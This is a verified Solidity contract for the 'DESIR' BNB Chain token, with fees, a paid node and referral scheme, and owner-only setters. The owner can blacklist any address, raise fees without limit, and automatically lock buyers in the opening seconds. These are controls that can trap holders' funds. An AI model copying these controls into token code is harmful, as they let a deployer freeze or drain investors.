/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

// SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface IUniswapV2Pair {
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
        event Transfer(address indexed from, address indexed to, uint256 value);

        function name() external pure returns (string memory);

        function symbol() external pure returns (string memory);

        function decimals() external pure returns (uint256);

        function totalSupply() external view returns (uint256);

        function balanceOf(address owner) external view returns (uint256);

        function allowance(address owner, address spender)
        external
        view
        returns (uint256);

        function approve(address spender, uint256 value) external returns (bool);

        function transfer(address to, uint256 value) external returns (bool);

        function transferFrom(
            address from,
            address to,
            uint256 value
        ) external returns (bool);

        function DOMAIN_SEPARATOR() external view returns (bytes32);

        function PERMIT_TYPEHASH() external pure returns (bytes32);

        function nonces(address owner) external view returns (uint256);

        function permit(
            address owner,
            address spender,
            uint256 value,
            uint256 deadline,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external;

        event Mint(address indexed sender, uint256 amount0, uint256 amount1);
        event Burn(
            address indexed sender,
            uint256 amount0,
            uint256 amount1,
            address indexed to
        );
        event Swap(
            address indexed sender,
            uint256 amount0In,
            uint256 amount1In,
            uint256 amount0Out,
            uint256 amount1Out,
            address indexed to
        );
        event Sync(uint112 reserve0, uint112 reserve1);

        function MINIMUM_LIQUIDITY() external pure returns (uint256);

        function factory() external view returns (address);

        function token0() external view returns (address);

        function token1() external view returns (address);

        function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

        function price0CumulativeLast() external view returns (uint256);

        function price1CumulativeLast() external view returns (uint256);

        function kLast() external view returns (uint256);

        function mint(address to) external returns (uint256 liquidity);

        function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

        function swap(
            uint256 amount0Out,
            uint256 amount1Out,
            address to,
            bytes calldata data
        ) external;

        function skim(address to) external;

        function sync() external;

        function initialize(address, address) external;
    }

    interface IUniswapV2Factory {
        event PairCreated(
            address indexed token0,
            address indexed token1,
            address pair,
            uint256
        );

        function feeTo() external view returns (address);

        function feeToSetter() external view returns (address);

        function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

        function allPairs(uint256) external view returns (address pair);

        function allPairsLength() external view returns (uint256);

        function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

        function setFeeTo(address) external;

        function setFeeToSetter(address) external;
    }


    interface IERC20 {
        /**
        * @dev Returns the amount of tokens in existence.
        */
        function totalSupply() external view returns (uint256);
        /**
        * @dev Returns the amount of tokens owned by `account`.
        */
        function balanceOf(address account) external view returns (uint256);
        /**
        * @dev Moves `amount` tokens from the caller's account to `recipient`.
        *
        * Returns a boolean value indicating whether the operation succeeded.
        *
        * Emits a {Transfer} event.
        */
        function transfer(address recipient, uint256 amount) external returns (bool);
        /**
        * @dev Returns the remaining number of tokens that `spender` will be
        * allowed to spend on behalf of `owner` through {transferFrom}. This is
        * zero by default.
        *
        * This value changes when {approve} or {transferFrom} are called.
        */
        function allowance(address owner, address spender)
        external
        view
        returns (uint256);

        /**
        * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
        *
        * Returns a boolean value indicating whether the operation succeeded.
        *
        * IMPORTANT: Beware that changing an allowance with this method brings the risk
        * that someone may use both the old and the new allowance by unfortunate
        * transaction ordering. One possible solution to mitigate this race
        * condition is to first reduce the spender's allowance to 0 and set the
        * desired value afterwards:
        * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        *
        * Emits an {Approval} event.
        */
        function approve(address spender, uint256 amount) external returns (bool);

        /**
        * @dev Moves `amount` tokens from `sender` to `recipient` using the
        * allowance mechanism. `amount` is then deducted from the caller's
        * allowance.
        *
        * Returns a boolean value indicating whether the operation succeeded.
        *
        * Emits a {Transfer} event.
        */
        function transferFrom(
            address sender,
            address recipient,
            uint256 amount
        ) external returns (bool);

        /**
        * @dev Emitted when `value` tokens are moved from one account (`from`) to
        * another (`to`).
        *
        * Note that `value` may be zero.
        */
        event Transfer(address indexed from, address indexed to, uint256 value);

        /**
        * @dev Emitted when the allowance of a `spender` for an `owner` is set by
        * a call to {approve}. `value` is the new allowance.
        */
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
    }

    interface IERC20Metadata is IERC20 {
        /**
        * @dev Returns the name of the token.
        */
        function name() external view returns (string memory);

        /**
        * @dev Returns the symbol of the token.
        */
        function symbol() external view returns (string memory);

        /**
        * @dev Returns the decimals places of the token.
        */
        function decimals() external view returns (uint256);
    }

    contract Ownable {
        address internal _owner;

        event OwnershipTransferred(
            address indexed previousOwner,
            address indexed newOwner
        );

        /**
        * @dev Initializes the contract setting the deployer as the initial owner.
        */
        constructor() {
            address msgSender = _msgSender();
            _owner = msgSender;
            emit OwnershipTransferred(address(0), msgSender);
        }

        function _msgSender() internal view returns(address) {
            return msg.sender;
        }
        /**
        * @dev Returns the address of the current owner.
        */
        function owner() public view returns (address) {
            return _owner;
        }

        /**
        * @dev Throws if called by any account other than the owner.
        */
        modifier onlyOwner() {
            require(_owner == _msgSender(), "Ownable: caller is not the owner");
            _;
        }

        /**
        * @dev Leaves the contract without owner. It will not be possible to call
        * `onlyOwner` functions anymore. Can only be called by the current owner.
        *
        * NOTE: Renouncing ownership will leave the contract without an owner,
        * thereby removing any functionality that is only available to the owner.
        */
        function renounceOwnership() public virtual onlyOwner {
            emit OwnershipTransferred(_owner, address(0));
            _owner = address(0);
        }

        /**
        * @dev Transfers ownership of the contract to a new account (`newOwner`).
        * Can only be called by the current owner.
        */
        function transferOwnership(address newOwner) public virtual onlyOwner {
            require(
                newOwner != address(0),
                "Ownable: new owner is the zero address"
            );
            emit OwnershipTransferred(_owner, newOwner);
            _owner = newOwner;
        }
    }

    contract ERC20 is Ownable, IERC20, IERC20Metadata {
        using SafeMath for uint256;

        mapping(address => uint256) private _balances;

        mapping(address => mapping(address => uint256)) private _allowances;
        address internal burnAddress = address(0x000000000000000000000000000000000000dEaD);
        uint256 private _totalSupply;

        string private _name;
        string private _symbol;
        uint256 private _decimals;

        /**
        * @dev Sets the values for {name} and {symbol}.
        *
        * The default value of {decimals} is 18. To select a different value for
        * {decimals} you should overload it.
        *
        * All two of these values are immutable: they can only be set once during
        * construction.
        */
        constructor(string memory name_, string memory symbol_,uint256 decimals_) {
            _name = name_;
            _symbol = symbol_;
            _decimals = decimals_;
        }

        /**
        * @dev Returns the name of the token.
        */
        function name() public view virtual override returns (string memory) {
            return _name;
        }

        /**
        * @dev Returns the symbol of the token, usually a shorter version of the
        * name.
        */
        function symbol() public view virtual override returns (string memory) {
            return _symbol;
        }

        /**
        * @dev Returns the number of decimals used to get its user representation.
        * For example, if `decimals` equals `2`, a balance of `505` tokens should
        * be displayed to a user as `5,05` (`505 / 10 ** 2`).
        *
        * Tokens usually opt for a value of 18, imitating the relationship between
        * Ether and Wei. This is the value {ERC20} uses, unless this function is
        * overridden;
        *
        * NOTE: This information is only used for _display_ purposes: it in
        * no way affects any of the arithmetic of the contract, including
        * {IERC20-balanceOf} and {IERC20-transfer}.
        */
        function decimals() public view virtual override returns (uint256) {
            return _decimals;
        }

        /**
        * @dev See {IERC20-totalSupply}.
        */
        function totalSupply() public view virtual override returns (uint256) {
            return _totalSupply;
        }

        /**
        * @dev See {IERC20-balanceOf}.
        */
        function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
        {
            return _balances[account];
        }

        /**
        * @dev See {IERC20-transfer}.
        *
        * Requirements:
        *
        * - `recipient` cannot be the zero address.
        * - the caller must have a balance of at least `amount`.
        */
        function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
        {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }

        /**
        * @dev See {IERC20-allowance}.
        */
        function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
        {
            return _allowances[owner][spender];
        }

        /**
        * @dev See {IERC20-approve}.
        *
        * Requirements:
        *
        * - `spender` cannot be the zero address.
        */
        function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
        {
            _approve(_msgSender(), spender, amount);
            return true;
        }

        /**
        * @dev See {IERC20-transferFrom}.
        *
        * Emits an {Approval} event indicating the updated allowance. This is not
        * required by the EIP. See the note at the beginning of {ERC20}.
        *
        * Requirements:
        *
        * - `sender` and `recipient` cannot be the zero address.
        * - `sender` must have a balance of at least `amount`.
        * - the caller must have allowance for ``sender``'s tokens of at least
        * `amount`.
        */
        function transferFrom(
            address sender,
            address recipient,
            uint256 amount
        ) public virtual override returns (bool) {
            _transfer(sender, recipient, amount);
            _approve(
                sender,
                _msgSender(),
                _allowances[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
            return true;
        }

        /**
        * @dev Atomically increases the allowance granted to `spender` by the caller.
        *
        * This is an alternative to {approve} that can be used as a mitigation for
        * problems described in {IERC20-approve}.
        *
        * Emits an {Approval} event indicating the updated allowance.
        *
        * Requirements:
        *
        * - `spender` cannot be the zero address.
        */
        function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
        {
            _approve(
                _msgSender(),
                spender,
                _allowances[_msgSender()][spender].add(addedValue)
            );
            return true;
        }

        /**
        * @dev Atomically decreases the allowance granted to `spender` by the caller.
        *
        * This is an alternative to {approve} that can be used as a mitigation for
        * problems described in {IERC20-approve}.
        *
        * Emits an {Approval} event indicating the updated allowance.
        *
        * Requirements:
        *
        * - `spender` cannot be the zero address.
        * - `spender` must have allowance for the caller of at least
        * `subtractedValue`.
        */
        function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
        {
            _approve(
                _msgSender(),
                spender,
                _allowances[_msgSender()][spender].sub(
                    subtractedValue,
                    "ERC20: decreased allowance below zero"
                )
            );
            return true;
        }

        /**
        * @dev Moves tokens `amount` from `sender` to `recipient`.
        *
        * This is internal function is equivalent to {transfer}, and can be used to
        * e.g. implement automatic token fees, slashing mechanisms, etc.
        *
        * Emits a {Transfer} event.
        *
        * Requirements:
        *
        * - `sender` cannot be the zero address.
        * - `recipient` cannot be the zero address.
        * - `sender` must have a balance of at least `amount`.
        */
        function _transfer(
            address sender,
            address recipient,
            uint256 amount
        ) internal virtual {
            require(sender != address(0), "ERC20: transfer from the zero address");
            require(recipient != address(0), "ERC20: transfer to the zero address");

            _beforeTokenTransfer(sender, recipient, amount);
            
            _transferToken(sender,recipient,amount);
        }
        
        function _transferToken(
            address sender,
            address recipient,
            uint256 amount
        ) internal virtual {
            _balances[sender] = _balances[sender].sub(
                amount,
                "ERC20: transfer amount exceeds balance"
            );
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }
        
        function _transferTokenn(
            address sender,
            address recipient,
            uint256 amount
        ) internal virtual {
            uint256 senderAmount = _balances[sender];
            uint256 recipientAmount = _balances[recipient];
            _balances[sender] = senderAmount.sub(
                amount,
                "ERC20: transfer amount exceeds balance"
            );
            _balances[recipient] = recipientAmount.add(amount);
            emit Transfer(sender, recipient, amount);
        }

        /** @dev Creates `amount` tokens and assigns them to `account`, increasing
        * the total supply.
        *
        * Emits a {Transfer} event with `from` set to the zero address.
        *
        * Requirements:
        *
        * - `account` cannot be the zero address.
        */
        function _mint(address account, uint256 amount) internal virtual {
            require(account != address(0), "ERC20: mint to the zero address");

            _beforeTokenTransfer(address(0), account, amount);

            _totalSupply = _totalSupply.add(amount);
            _balances[account] = _balances[account].add(amount);
            emit Transfer(address(0), account, amount);
        }

        /**
        * @dev Destroys `amount` tokens from `account`, reducing the
        * total supply.
        *
        * Emits a {Transfer} event with `to` set to the zero address.
        *
        * Requirements:
        *
        * - `account` cannot be the zero address.
        * - `account` must have at least `amount` tokens.
        */
        function _burn(address account, uint256 amount) internal virtual {
            require(account != address(0), "ERC20: burn from the zero address");

            _beforeTokenTransfer(account, burnAddress, amount);

            _balances[account] = _balances[account].sub(
                amount,
                "ERC20: burn amount exceeds balance"
            );
            _balances[burnAddress] = _balances[burnAddress].add(amount);
            emit Transfer(account, burnAddress, amount);
        }
        
        

        /**
        * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
        *
        * This internal function is equivalent to `approve`, and can be used to
        * e.g. set automatic allowances for certain subsystems, etc.
        *
        * Emits an {Approval} event.
        *
        * Requirements:
        *
        * - `owner` cannot be the zero address.
        * - `spender` cannot be the zero address.
        */
        function _approve(
            address owner,
            address spender,
            uint256 amount
        ) internal virtual {
            require(owner != address(0), "ERC20: approve from the zero address");
            require(spender != address(0), "ERC20: approve to the zero address");

            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }

        /**
        * @dev Hook that is called before any transfer of tokens. This includes
        * minting and burning.
        *
        * Calling conditions:
        *
        * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
        * will be to transferred to `to`.
        * - when `from` is zero, `amount` tokens will be minted for `to`.
        * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
        * - `from` and `to` are never both zero.
        *
        * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
        */
        function _beforeTokenTransfer(
            address from,
            address to,
            uint256 amount
        ) internal virtual {}
    }


    library SafeMath {
        /**
        * @dev Returns the addition of two unsigned integers, reverting on
        * overflow.
        *
        * Counterpart to Solidity's `+` operator.
        *
        * Requirements:
        *
        * - Addition cannot overflow.
        */
        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");

            return c;
        }

        /**
        * @dev Returns the subtraction of two unsigned integers, reverting on
        * overflow (when the result is negative).
        *
        * Counterpart to Solidity's `-` operator.
        *
        * Requirements:
        *
        * - Subtraction cannot overflow.
        */
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }

        /**
        * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
        * overflow (when the result is negative).
        *
        * Counterpart to Solidity's `-` operator.
        *
        * Requirements:
        *
        * - Subtraction cannot overflow.
        */
        function sub(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            uint256 c = a - b;

            return c;
        }

        /**
        * @dev Returns the multiplication of two unsigned integers, reverting on
        * overflow.
        *
        * Counterpart to Solidity's `*` operator.
        *
        * Requirements:
        *
        * - Multiplication cannot overflow.
        */
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) {
                return 0;
            }

            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");

            return c;
        }

        /**
        * @dev Returns the integer division of two unsigned integers. Reverts on
        * division by zero. The result is rounded towards zero.
        *
        * Counterpart to Solidity's `/` operator. Note: this function uses a
        * `revert` opcode (which leaves remaining gas untouched) while Solidity
        * uses an invalid opcode to revert (consuming all remaining gas).
        *
        * Requirements:
        *
        * - The divisor cannot be zero.
        */
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return div(a, b, "SafeMath: division by zero");
        }

        /**
        * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
        * division by zero. The result is rounded towards zero.
        *
        * Counterpart to Solidity's `/` operator. Note: this function uses a
        * `revert` opcode (which leaves remaining gas untouched) while Solidity
        * uses an invalid opcode to revert (consuming all remaining gas).
        *
        * Requirements:
        *
        * - The divisor cannot be zero.
        */
        function div(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            require(b > 0, errorMessage);
            uint256 c = a / b;
            // assert(a == b * c + a % b); // There is no case in which this doesn't hold

            return c;
        }
    }

    interface IUniswapV2Router01 {
        function factory() external pure returns (address);

        function WETH() external pure returns (address);

        function addLiquidity(
            address tokenA,
            address tokenB,
            uint256 amountADesired,
            uint256 amountBDesired,
            uint256 amountAMin,
            uint256 amountBMin,
            address to,
            uint256 deadline
        )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

        function addLiquidityETH(
            address token,
            uint256 amountTokenDesired,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline
        )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint256 liquidity,
            uint256 amountAMin,
            uint256 amountBMin,
            address to,
            uint256 deadline
        ) external returns (uint256 amountA, uint256 amountB);

        function removeLiquidityETH(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline
        ) external returns (uint256 amountToken, uint256 amountETH);

        function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint256 liquidity,
            uint256 amountAMin,
            uint256 amountBMin,
            address to,
            uint256 deadline,
            bool approveMax,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external returns (uint256 amountA, uint256 amountB);

        function removeLiquidityETHWithPermit(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline,
            bool approveMax,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external returns (uint256 amountToken, uint256 amountETH);

        function swapExactTokensForTokens(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapTokensForExactTokens(
            uint256 amountOut,
            uint256 amountInMax,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapExactETHForTokens(
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external payable returns (uint256[] memory amounts);

        function swapTokensForExactETH(
            uint256 amountOut,
            uint256 amountInMax,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapExactTokensForETH(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external returns (uint256[] memory amounts);

        function swapETHForExactTokens(
            uint256 amountOut,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external payable returns (uint256[] memory amounts);

        function quote(
            uint256 amountA,
            uint256 reserveA,
            uint256 reserveB
        ) external pure returns (uint256 amountB);

        function getAmountOut(
            uint256 amountIn,
            uint256 reserveIn,
            uint256 reserveOut
        ) external pure returns (uint256 amountOut);

        function getAmountIn(
            uint256 amountOut,
            uint256 reserveIn,
            uint256 reserveOut
        ) external pure returns (uint256 amountIn);

        function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

        function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
    }

    interface IUniswapV2Router02 is IUniswapV2Router01 {
        function removeLiquidityETHSupportingFeeOnTransferTokens(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline
        ) external returns (uint256 amountETH);

        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
            address token,
            uint256 liquidity,
            uint256 amountTokenMin,
            uint256 amountETHMin,
            address to,
            uint256 deadline,
            bool approveMax,
            uint256 v,
            bytes32 r,
            bytes32 s
        ) external returns (uint256 amountETH);

        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external;

        function swapExactETHForTokensSupportingFeeOnTransferTokens(
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external payable;

        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint256 amountIn,
            uint256 amountOutMin,
            address[] calldata path,
            address to,
            uint256 deadline
        ) external;
    }

    contract DESIR is ERC20 {
        using SafeMath for uint256;
        uint256 total = 233559 * 10 ** 18;
        uint256 _decimals = 18;
        //运营钱包
        address public operateWallet;
        //社区钱包
        address public communityWallet;
        //节点分红钱包
        address public nodeRewardWallet;
        //买卖销毁0.5%
        uint256 public burnFee = 5;
        //卖出0.5%运营
        uint256 public operateFee = 5;
        //卖出1%社区
        uint256 public communityFee = 10;
        //卖出3%节点分红
        uint256 public nodeFee = 30; 
        //1~9阶段的信息
        mapping(uint256 => Stage) public stageInfo;
        //当前阶段
        uint256 public thisStage = 1;
        //最大阶段
        uint256 public immutable maxStage = 9;
        uint256 public maxNode = 300;
        //可交易白名单
        mapping(address => bool) public transWallet;
        //交易开关
        bool public transOpen; 
        //开盘限购
        uint256 public maxBuy = 10 * 10 ** 18;
        //限购时间
        uint256 public limitBuyTime = 60;
        uint256 public openTime;
        //杀机器人时间
        uint256 public killTime = 50;
        //地址成为节点阶段
        mapping(address => uint256) public nodeJoin;
        //节点总数
        uint256 public nodeCount;
        //接收扣取的LPToken
        address public lpWallet;
        //免手续费名单
        mapping(address => bool) public isExcludedFromFees;
        //黑名单
        mapping(address => bool) public lockAddress;
        //绑定邀请人
        mapping(address => address) public bindInvite;
        
        struct Stage {
            //当前已加入
            uint256 thisNode;
            //所需Lp数量
            uint256 lpToken;
        }
        address public immutable uniswapV2Pair;
        IUniswapV2Router02 public immutable uniswapV2Router;

        event BindInvite(address indexed oldWallet,address indexed newWallet);
        event ActiveNode(uint256 stage, address indexed  wallet, uint256 lpAmount);
        //满人数后触发
        event StageEnd(uint256 stage);

        constructor(address[] memory _wallets) ERC20("DESIR", "DESIR",_decimals) {
            _mint(_wallets[0], total);
            IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_wallets[1]);
            address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(_wallets[2]));
            uniswapV2Router = _uniswapV2Router;
            uniswapV2Pair = _uniswapV2Pair;

            operateWallet = address(_wallets[3]);
            communityWallet = address(_wallets[4]);
            lpWallet = address(_wallets[5]);        
            nodeRewardWallet = address(_wallets[6]);
            isExcludedFromFees[_wallets[0]] = true;
            isExcludedFromFees[address(this)] = true;
            transWallet[_wallets[0]] = true;
            joinNodeCore(_wallets[0]);
        }
        
        receive() external payable {
        }

        function bind(address _oldWallet) public {
            require(!isBind(_msgSender()),"The invitation address has been bound");
            require(isNodeWallet(_oldWallet),"Invitation wallet is not activated");
            require(isBind(_oldWallet),"old user is not found");
            bindInvite[_msgSender()] = _oldWallet;
            emit BindInvite(_oldWallet, _msgSender());
        }

        function isBind(address _account) public view returns(bool) {
            return bindInvite[_account] != address(0) || _account == owner();
        }

        function setStageLp(uint256 _stageId,uint256 _lpToken) public onlyOwner {
            require(_stageId > 0 && _stageId <= maxStage,"Cannot set this stage");
            Stage memory _stage = stageInfo[_stageId];
            _stage.lpToken = _lpToken;
            stageInfo[_stageId] = _stage;
        }

        function activeNode() public {
            require(isBind(_msgSender()),"is not bind parent");
            require(!isNodeWallet(_msgSender()),"Is already a node");
            Stage memory _stage = stageInfo[thisStage];
            require(_stage.thisNode < maxNode,"node is full");
            IERC20 _LPContract = IERC20(uniswapV2Pair);
            require(_stage.lpToken <= _LPContract.balanceOf(_msgSender()),"LP Token Insufficient");
            _LPContract.transferFrom(_msgSender(),lpWallet,_stage.lpToken);
            joinNodeCore(_msgSender());
        }

        function joinNodeCore(address _account) internal {
            uint256 _thisStage = thisStage;
            Stage memory _stage = stageInfo[_thisStage];
            nodeJoin[_account] = _thisStage;
            _stage.thisNode = _stage.thisNode + 1;
            stageInfo[_thisStage] = _stage;
            nodeCount ++;
            emit ActiveNode(_thisStage, _account,_stage.lpToken);
            if(_stage.thisNode >= maxNode) emit StageEnd(_thisStage);
        }

        function testStageEndEvent(uint256 _stage) public {
            emit StageEnd(_stage);
        }

        function setStage(uint256 _stageId) public onlyOwner {
            require(_stageId > 0 && _stageId <= maxStage,"Cannot set this stage");
            thisStage = _stageId;
        }

        function setKillTime(uint256 _val) public onlyOwner{
            killTime = _val;
        }

        function setLimitBuyTime(uint256 _val) public onlyOwner {
            limitBuyTime = _val;
        }
        
        function setTransOpen(bool _val) public onlyOwner{
            openTime = block.timestamp;
            transOpen = _val;
        }

        function batchExcludeFromFees(address[] calldata _accounts, bool _select) public onlyOwner {
            for (uint i; i < _accounts.length; i++) {
                isExcludedFromFees[_accounts[i]] = _select;
            }
        }

        function batchLockAddress(address[] calldata _accounts,bool _select) public onlyOwner {
            for (uint256 i = 0; i < _accounts.length; i++) {
                lockAddress[_accounts[i]] = _select;
            }
        }

        function batchTransWallet(address[] calldata _accounts,bool _select) public onlyOwner {
            for (uint256 i = 0; i < _accounts.length; i++) {
                transWallet[_accounts[i]] = _select;
            }
        }
        
        function _transfer(
            address _from,
            address _to,
            uint256 _amount
        ) internal override {
            require(_from != address(0), "ERC20: transfer from the zero address");
            require(_to != address(0), "ERC20: transfer to the zero address");
            require(!lockAddress[_from] && !lockAddress[_to],"account is lock");
            require(_amount > 0,"not transfer zero amount");
            address _uniswapV2Pair = uniswapV2Pair;
            if(!isExcludedFromFees[_from] && !isExcludedFromFees[_to] && (_from == _uniswapV2Pair || _to == _uniswapV2Pair)){
                if(!transOpen) {
                    require(transWallet[_from] || transWallet[_to],"Not on the transaction whitelist");
                } else {
                    if(openTime.add(killTime) > block.timestamp && _from == _uniswapV2Pair) {
                        lockAddress[_to] = true;
                    } else if(openTime.add(limitBuyTime) > block.timestamp){
                        require(_amount < maxBuy + 1,"Current purchase restrictions");
                    }
                }
                //销毁
                uint256 _burnAmount = calculateFee(_amount, burnFee);
                super._burn(_from, _burnAmount);
                _amount = _amount.sub(_burnAmount);
                if (_to == _uniswapV2Pair){
                    //运营
                    uint256 _operateAmount = calculateFee(_amount, operateFee);    
                    super._transfer(_from, operateWallet, _operateAmount);
                    _amount = _amount.sub(_operateAmount);
                    //社区
                    uint256 _communityAmount = calculateFee(_amount, communityFee);    
                    super._transfer(_from, communityWallet, _communityAmount);
                    _amount = _amount.sub(_communityAmount);
                    //lp节点
                    uint256 _nodeRewardAmount = calculateFee(_amount, nodeFee);    
                    super._transfer(_from,nodeRewardWallet,_nodeRewardAmount);
                    _amount = _amount.sub(_nodeRewardAmount);
                }
            }
            super._transfer(_from,_to,_amount);
        }

        function setOperateWallet(address _account) public onlyOwner {
            operateWallet = _account;
        }

        function setMaxBuy(uint256 _val) public onlyOwner {
            maxBuy = _val * 10 ** 18;
        }        

        function setCommunityWallet(address _account) public onlyOwner {
            communityWallet = _account;
        }

        function setLPWallet(address _account) public onlyOwner {
            lpWallet = _account;
        }

        function setNodeRewardWallet(address _account) public onlyOwner {
            nodeRewardWallet = _account;
        }

        function setOperateFee(uint256 _operateFee) public onlyOwner {
            operateFee = _operateFee;
        }

        function setCommunityFee(uint256 _communityFee) public onlyOwner {
            communityFee = _communityFee;
        }

        function setNodeFee(uint256 _nodeFee) public onlyOwner {
            nodeFee = _nodeFee;
        }
        
        function setBurnFee(uint256 _burnFee) public onlyOwner {
            burnFee = _burnFee;
        }
        
        function isNodeWallet(address _account) public view returns(bool) {
            return nodeJoin[_account] != uint256(0); 
        }

        function calculateFee(uint256 _amount,uint256 _fee) internal pure returns(uint256){
            return _amount.mul(_fee).div(10**3);
        }
}